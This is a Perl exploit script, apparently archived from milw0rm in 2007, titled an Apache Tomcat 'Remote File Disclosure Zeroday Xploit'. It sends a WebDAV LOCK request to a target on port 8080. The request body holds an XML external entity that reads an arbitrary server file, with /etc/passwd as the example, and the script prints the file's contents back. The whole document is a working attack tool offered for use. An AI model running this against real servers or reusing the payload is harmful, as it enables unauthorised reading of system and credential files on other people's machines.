#!/usr/bin/perl
#******************************************************
# Apache Tomcat Remote File Disclosure Zeroday Xploit
# kcdarookie aka eliteb0y / 2007
#
# thanx to the whole team & andi :)
# +++KEEP PRIV8+++
#
# This Bug may reside in different WebDav implementations,
# Warp your mind!
# +You will need auth for the exploit to work...
#******************************************************

use IO::Socket;
use MIME::Base64; ### FIXME! Maybe support other auths too ?

# SET REMOTE PORT HERE
$remoteport = 8080;

sub usage {
	print "Apache Tomcat Remote File Disclosure Zeroday Xploit\n";
	print "kcdarookie aka eliteb0y / 2007\n";
	print "usage: perl TOMCATXPL <remotehost> <webdav file> <file to retrieve> [username] [password]\n";
	print "example: perl TOMCATXPL www.hostname.com /webdav /etc/passwd tomcat tomcat\n";exit;
}

if ($#ARGV < 2) {usage();}

$hostname = $ARGV[0];
$webdavfile = $ARGV[1];
$remotefile = $ARGV[2];

$username = $ARGV[3];
$password = $ARGV[4];

my $sock = IO::Socket::INET->new(PeerAddr => $hostname,
                              PeerPort => $remoteport,
                              Proto    => 'tcp');
                              
$|=1;
$BasicAuth = encode_base64("$username:$password");

$KRADXmL = 
"<?xml version=\"1.0\"?>\n"
."<!DOCTYPE REMOTE [\n"
."<!ENTITY RemoteX SYSTEM \"$remotefile\">\n"
."]>\n"
."<D:lockinfo xmlns:D='DAV:'>\n"
."<D:lockscope><D:exclusive/></D:lockscope>\n"
."<D:locktype><D:write/></D:locktype>\n"
."<D:owner>\n"
."<D:href>\n"
."<REMOTE>\n"
."<RemoteX>&RemoteX;</RemoteX>\n"
."</REMOTE>\n"
."</D:href>\n"
."</D:owner>\n"
."</D:lockinfo>\n";

print "Apache Tomcat Remote File Disclosure Zeroday Xploit\n";
print "kcdarookie aka eliteb0y / 2007\n";
print "Launching Remote Exploit...\n";

$ExploitRequest =
 "LOCK $webdavfile HTTP/1.1\r\n"
."Host: $hostname\r\n";

if ($username ne "") {
$ExploitRequest .= "Authorization: Basic $BasicAuth\r\n";	
}
$ExploitRequest .= "Content-Type: text/xml\r\nContent-Length: ".length($KRADXmL)."\r\n\r\n" . $KRADXmL;

print $sock $ExploitRequest;

while(<$sock>) {
	print;
}

# milw0rm.com [2007-10-14]
